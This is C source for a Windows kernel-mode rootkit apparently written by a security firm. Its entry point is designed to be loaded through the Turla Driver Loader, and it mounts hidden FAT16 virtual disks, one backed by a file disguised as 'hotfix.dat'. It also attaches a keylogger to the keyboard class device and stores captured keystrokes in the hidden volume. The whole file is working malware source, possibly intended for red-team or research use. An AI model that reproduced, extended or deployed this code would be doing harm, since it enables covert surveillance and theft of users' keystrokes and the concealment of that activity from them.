/*
 * Copyright 2022 Praetorian Security, Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <ntddk.h>

#include "vfs.h"
#include "keylog.h"

//
// Forward Declarations for Static Functions
//

VOID
RealMain();

static NTSTATUS
RunQueueWorkItem(
	IN PDRIVER_OBJECT DriverObject,
	IN PUNICODE_STRING regPath
);

VOID 
WorkItemRoutine(
	PDEVICE_OBJECT pDevObj, PVOID pContext
);

static NTSTATUS 
SetupVFS(
	IN PDRIVER_OBJECT DriverObject, 
	IN PUNICODE_STRING regPath
	);

static NTSTATUS 
SetupKeylogger(
		IN PDRIVER_OBJECT DriverObject, 
		IN PUNICODE_STRING regPath
		);

//
//  Undocumented NT Function Forward Declarations
//
	
NTKERNELAPI NTSTATUS
IoCreateDriver(
	IN PUNICODE_STRING DriverName, OPTIONAL
	IN PDRIVER_INITIALIZE InitializationFunction
	);

NTSTATUS 
DriverEntry(
	IN PDRIVER_OBJECT DriverObject,
	IN PUNICODE_STRING regPath
	)

/*++

  Routine Description:

	Entrypoint for IG rootkit this routine can be executed as driverless
	code as it does not utilize the DriverObject and regPath parameters. This
	should allow our code to be loaded by the Turla Driver Loader from hFiref0x

  Arguments:

	DriverObject - Unreferenced Parameter

	regPath - Unreferenced Parameter

  Return Value:

	Always returns successful status

--*/

{
	KIRQL Irql;
	PWSTR sIrql;

	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(regPath);

	DbgPrint("[IG] DriverEntry Called");
	DbgPrint("[IG] System range start is %p, code mapped at %p\n", MmSystemRangeStart, DriverEntry);

	Irql = KeGetCurrentIrql();

	switch (Irql) {

	case PASSIVE_LEVEL:
		sIrql = L"PASSIVE_LEVEL";
		break;
	case APC_LEVEL:
		sIrql = L"APC_LEVEL";
		break;
	case DISPATCH_LEVEL:
		sIrql = L"DISPATCH_LEVEL";
		break;
	case CMCI_LEVEL:
		sIrql = L"CMCI_LEVEL";
		break;
	case CLOCK_LEVEL:
		sIrql = L"CLOCK_LEVEL";
		break;
	case IPI_LEVEL:
		sIrql = L"IPI_LEVEL";
		break;
	case HIGH_LEVEL:
		sIrql = L"HIGH_LEVEL";
		break;
	default:
		sIrql = L"Unknown Value";
		break;
	}

	DbgPrint("[IG] DriverEntry KeGetCurrentIrql=%ws\n", sIrql);

	if (Irql == PASSIVE_LEVEL) {
		DbgPrint("[IG] Test Running at PASSIVE_LEVEL");
		RealMain(NULL);
	}
	else {
		DbgPrint("[IG] Queuing an I/O work item to run asychronously");
		IoCreateDriver(NULL, RunQueueWorkItem);
	}

	return STATUS_SUCCESS;
}

VOID 
WorkItemRoutine(
	IN PDEVICE_OBJECT pDevObj, 
	IN PVOID pContext
	) 
{
	KIRQL Irql;
	PWSTR sIrql;

	UNREFERENCED_PARAMETER(pDevObj);
	UNREFERENCED_PARAMETER(pContext);

	Irql = KeGetCurrentIrql();

	switch (Irql) {

	case PASSIVE_LEVEL:
		sIrql = L"PASSIVE_LEVEL";
		break;
	case APC_LEVEL:
		sIrql = L"APC_LEVEL";
		break;
	case DISPATCH_LEVEL:
		sIrql = L"DISPATCH_LEVEL";
		break;
	case CMCI_LEVEL:
		sIrql = L"CMCI_LEVEL";
		break;
	case CLOCK_LEVEL:
		sIrql = L"CLOCK_LEVEL";
		break;
	case IPI_LEVEL:
		sIrql = L"IPI_LEVEL";
		break;
	case HIGH_LEVEL:
		sIrql = L"HIGH_LEVEL";
		break;
	default:
		sIrql = L"Unknown Value";
		break;
	}

	DbgPrint("Work Item Function - KeGetCurrentIrql=%ws\n", sIrql);
	RealMain();
}

NTSTATUS
RunQueueWorkItem(
	IN PDRIVER_OBJECT DriverObject,
	IN PUNICODE_STRING regPath
	)
{
	UNREFERENCED_PARAMETER(regPath);

	NTSTATUS status;
	PDEVICE_OBJECT pDeviceObject = NULL;
	UNICODE_STRING usDriverName, usDosDeviceName;

	DbgPrint("[IG] RunQueueWorkitem Called");

    // TODO: I don't think we actually need to make a valid DriverObject and DeviceObject to
	// queue a work item to execute asynchronously. Instead, we could potentially investigate
	// creating a fake structure and passing that in.
	RtlInitUnicodeString(&usDriverName, L"\\Device\\QueueWorkItem");
	RtlInitUnicodeString(&usDosDeviceName, L"\\DosDevices\\QueueWorkItem");

	status = IoCreateDevice(DriverObject, 0, &usDriverName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pDeviceObject);

	if (status == STATUS_SUCCESS)
	{
		DbgPrint("[IG] Queuing Work Item");
		PIO_WORKITEM pWorkItem;
		pWorkItem = IoAllocateWorkItem(pDeviceObject);
		IoQueueWorkItem(pWorkItem, WorkItemRoutine, DelayedWorkQueue, NULL);
	}
	else {
		DbgPrint("[IG] Error creating device object with IoCreateDevice, status = 0x%08x", status);
	}

	return status;
}

VOID
RealMain()
{
	DbgPrint("[IG] RealMain Called");

	//
	// Setup and initialize the VFS component needs to be done before
	// the keylogger module is initialized because we are storing
	// the intercepted keystrokes into the VFS
	//

	IoCreateDriver(NULL, SetupVFS);

	//
	// To initialize the keylogging module we need to create a second
	// driver object using IopCreateDriver
	//

	IoCreateDriver(NULL, SetupKeylogger);
}

static NTSTATUS 
SetupVFS(
	IN PDRIVER_OBJECT DriverObject, 
	IN PUNICODE_STRING regPath
	)

/*++

  Routine Description:

  	Setup routine for IG VFS creates the non-volatile and volatile 
	Virtual File Systems (VFS)
    
  Arguments:
  
  	DriverObject - DriverObject associated with driver

	regPath - Unreferenced Parameter

  Return Value:
  
  	Always returns successful status

--*/

{
	NTSTATUS status;
	LARGE_INTEGER DiskSize;
	PDEVICE_OBJECT VFSObject = NULL;
	UNICODE_STRING DeviceName;
	UNICODE_STRING DiskName;
	UNICODE_STRING VFSPath;

	DiskSize.QuadPart = VFS_MiB(16);

	VFSInit(DriverObject, regPath);

	//
	// Mount Non-Volatile VFS
	//

	RtlInitUnicodeString(&DeviceName, L"\\Device\\RawDisk1");
	RtlInitUnicodeString(&DiskName,   L"\\DosDevices\\Hd1");
	RtlInitUnicodeString(&VFSPath,    L"\\SystemRoot\\hotfix.dat");

	status = VFSCreateDisk(
		&DeviceName,
		&DiskName,
		&VFSPath,	
		&VFSObject,
		NULL,
		&DiskSize,
		FAT16
	     );

	//
	// Mount Volatile VFS
	//

	RtlInitUnicodeString(&DeviceName, L"\\Device\\RawDisk2");
	RtlInitUnicodeString(&DiskName,   L"\\DosDevices\\Hd2");
	DiskSize.QuadPart = VFS_MiB(31);

	status = VFSCreateDisk(
		&DeviceName,
		&DiskName,
		NULL,	
		&VFSObject,
		NULL,
		&DiskSize,
		FAT16
	     );

	return STATUS_SUCCESS;
}

static NTSTATUS 
SetupKeylogger(
		IN PDRIVER_OBJECT DriverObject, 
		IN PUNICODE_STRING regPath
		)
{
	UNICODE_STRING KeyboardClass;
	UNICODE_STRING KeylogOutputFile;

	UNREFERENCED_PARAMETER(regPath);

	//
	// Initialize Keylogging Subsystem
	//

	KeylogInit(DriverObject);

	RtlInitUnicodeString(&KeyboardClass, L"\\Device\\KeyboardClass0");
	RtlInitUnicodeString(&KeylogOutputFile, L"\\??\\Hd1\\Keylog.txt");
	
	KeylogAttachDevice(&KeyboardClass, &KeylogOutputFile);

	return STATUS_SUCCESS;
}